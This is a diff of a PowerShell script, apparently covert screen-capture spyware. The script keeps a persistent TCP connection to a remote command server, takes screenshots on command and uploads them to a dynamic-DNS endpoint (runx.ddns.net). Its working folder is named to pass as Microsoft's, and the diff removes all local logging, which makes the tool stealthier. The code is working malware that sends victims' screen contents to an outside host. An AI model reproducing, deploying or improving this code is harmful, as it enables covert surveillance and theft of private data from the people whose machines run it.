@@ -2,24 +2,10 @@ if (!(Test-Path "$env:TEMP\run")) {
   $null = New-Item "$env:TEMP\run" -ItemType Directory
 }
 
-$logDir = "$env:APPDATA\Microsoft\run"
-if (-not (Test-Path $logDir)) {
-  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-}
-$logFile = "$logDir\ss_control.log"
-
-function Log-Msg($msg) {
-  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
-  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
-}
-
 $mutex = New-Object System.Threading.Mutex($false, "ss_control")
 if (-not $mutex.WaitOne(0)) {
-  Log-Msg "[INFO] Another ss_control instance is running. Exiting."
   exit
 }
-
-Log-Msg "[INFO] ss_control started."
 
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
 if (Test-Path $IdPath) {
@@ -38,10 +24,8 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "ab44043"
+$SCRIPT_VERSION = "7cc3a4b"
 $clientVersion = $SCRIPT_VERSION
-
-Log-Msg "[INFO] Client: $uniqueUser, Version: $clientVersion"
 
 $UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
 if (!(Test-Path $UserFolder)) {
@@ -55,7 +39,6 @@ $VPS_PORT = 5003
 $VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"
 
 function Capture-And-Upload {
-  Log-Msg "[INFO] Capture requested. Capturing frame..."
   $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
   $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
   $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"
@@ -98,7 +81,6 @@ function Capture-And-Upload {
       -UseBasicParsing |
       Out-Null
 
-    Log-Msg "[INFO] Frame uploaded: $Timestamp.jpg"
     Remove-Item $JpegPath -Force
   }
 }
@@ -106,12 +88,10 @@ function Capture-And-Upload {
 try {
   while ($true) {
     try {
-      Log-Msg "[INFO] Connecting ss_control to TCP socket $VPS_HOST:$VPS_PORT..."
       $tcpClient = New-Object System.Net.Sockets.TcpClient
       $tcpClient.Connect($VPS_HOST, $VPS_PORT)
 
       if ($tcpClient.Connected) {
-        Log-Msg "[INFO] ss_control TCP connection established successfully."
         $stream = $tcpClient.GetStream()
         $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
         $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
@@ -123,7 +103,6 @@ try {
         while ($tcpClient.Connected) {
           $line = $reader.ReadLine()
           if ($null -eq $line) {
-            Log-Msg "[INFO] Server closed TCP connection."
             break
           }
 
@@ -132,7 +111,6 @@ try {
             continue
           }
 
-          Log-Msg "[INFO] Received TCP payload in ss_control: $line"
           $r = $line | ConvertFrom-Json
           if ($r.capture -eq $true) {
             Capture-And-Upload
@@ -141,7 +119,6 @@ try {
       }
     }
     catch {
-      Log-Msg "[ERROR] ss_control TCP Error: $($_.Exception.ToString())"
     }
     finally {
       if ($tcpClient) {
@@ -150,7 +127,6 @@ try {
       }
     }
 
-    Log-Msg "[INFO] ss_control Reconnecting in 3 seconds..."
     Start-Sleep -Seconds 3
   }
 }
